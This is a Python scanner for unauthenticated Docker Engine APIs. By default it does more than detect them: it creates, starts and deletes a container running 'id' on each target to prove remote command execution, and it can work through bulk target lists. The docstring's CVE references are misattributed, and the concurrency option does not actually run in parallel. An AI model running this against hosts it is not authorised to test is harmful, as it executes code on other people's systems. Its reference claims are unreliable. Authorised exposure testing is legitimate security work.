#!/usr/bin/env python3
"""
Docker API Remote Code Execution Scanner
=========================================
Scans for exposed Docker APIs accessible without authentication and probes
for remote code execution vulnerabilities. The Docker API, when exposed,
allows attackers to execute container commands, manipulate images, and more.

Key Details:
  - Commonly impacts hosts where the Docker socket is improperly bound to
    external interfaces, exposing the API port (default: 2375/2376).
  - Attackers can remotely run commands inside containers or start new ones,
    leading to full control over the host under certain configurations.
  - Can be paired with privilege escalation techniques from container escape
    vulnerabilities.
  - Multiple CVEs and security misconfiguration advisories address this issue.

Usage:
  # Scan a single target (active probing enabled)
  python docker_api_rce_scanner.py --target http://example.com:2375

  # Detection only — skip active probes
  python docker_api_rce_scanner.py --target http://example.com:2375 --safe

  # Bulk scan from file with concurrency
  python docker_api_rce_scanner.py --list targets.txt --output findings.json --concurrency 50

References:
  - CVE-2020-15257: Docker API misconfiguration leading to exploitation.
  - CVE-2019-5736: Vulnerabilities enabling container escapes via Docker API.
  - https://docs.docker.com/engine/api/
  - https://www.hackster.io/news/docker-exposed-servers-threat-analysis-430028bcee8b
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "docker_api_rce_scanner"
SEMAPHORE_LIMIT = 30

API_ENDPOINTS = [
    "/containers/json",
    "/images/json",
    "/volumes",
    "/networks",
    "/version",
    "/info",
]

SAFE_PROBES = [
    "/version",
    "/info",
]

ACTIVE_PROBES = [
    "/containers/create",
    "/containers/json",
]

RCE_PAYLOAD = {
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "id"],
    "Tty": False,
}

REQUEST_TIMEOUT = 8


# ── Docker API Scanner ────────────────────────────────────────────────────────

async def fingerprint_docker_api(client: httpx.AsyncClient, target: str) -> Optional[dict]:
    """
    Detect exposed Docker APIs by querying common endpoints.
    Returns Docker version information if detected.
    """
    try:
        response = await client.get(f"{target}/version", timeout=REQUEST_TIMEOUT)
        if response.status_code == 200 and response.json().get("ApiVersion"):
            return response.json()
        return None
    except Exception:
        return None


async def probe_rce(client: httpx.AsyncClient, target: str) -> bool:
    """
    Perform an active probe to check for remote code execution capabilities.
    Creates a temporary container and tries to execute a command.
    """
    try:
        response = await client.post(f"{target}/containers/create", json=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT)
        if response.status_code == 201 and "Id" in response.json():
            container_id = response.json()["Id"]

            # Start the container
            await client.post(f"{target}/containers/{container_id}/start", timeout=REQUEST_TIMEOUT)

            # Check container logs for command output
            logs_response = await client.get(f"{target}/containers/{container_id}/logs?stdout=true", timeout=REQUEST_TIMEOUT)
            await client.delete(f"{target}/containers/{container_id}?force=true", timeout=REQUEST_TIMEOUT)

            if logs_response.status_code == 200 and "uid=" in logs_response.text:
                return True
        return False
    except Exception:
        return False


async def scan_target(client: httpx.AsyncClient, target: str, safe_mode: bool) -> dict:
    """
    Scan a single target for exposed Docker API endpoints and potential RCE.
    """
    result = {
        "target": target,
        "timestamp": datetime.now(tz=timezone.utc).isoformat(),
    }

    fingerprint = await fingerprint_docker_api(client, target)
    if fingerprint:
        result["status"] = "Docker API detected"
        result["version_info"] = fingerprint

        if not safe_mode:
            rce_possible = await probe_rce(client, target)
            result["rce_possible"] = rce_possible

            if rce_possible:
                result["severity"] = "critical"
            else:
                result["severity"] = "high"
        else:
            result["severity"] = "info"
    else:
        result["status"] = "No API detected"
        result["severity"] = "info"

    return result


async def main(args):
    """
    Main asynchronous function that orchestrates scanning of targets.
    """
    targets = []
    if args.list:
        with open(args.list, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
    elif args.target:
        targets = [args.target]

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        for target in targets:
            async with semaphore:
                result = await scan_target(client, target, args.safe)
                results.append(result)
                print(c(
                    RED if result["severity"] == "critical" else YELLOW if result["severity"] == "high" else GREEN,
                    f"[{result['severity'].upper()}] {result['target']} - {result['status']}"
                ))
    
    if args.output:
        with open(args.output, "w") as file:
            json.dump(results, file, indent=2)

    print(c(CYAN, f"\nScan completed. Results written to {args.output}" if args.output else "\nScan completed."))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Docker API Remote Code Execution Scanner")
    parser.add_argument("--target", help="Target URL (e.g., http://example.com:2375)")
    parser.add_argument("--list", help="File with a list of targets to scan")
    parser.add_argument("--output", help="Output findings to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no active probing)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrent scan limit")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification")

    args = parser.parse_args()
    asyncio.run(main(args))
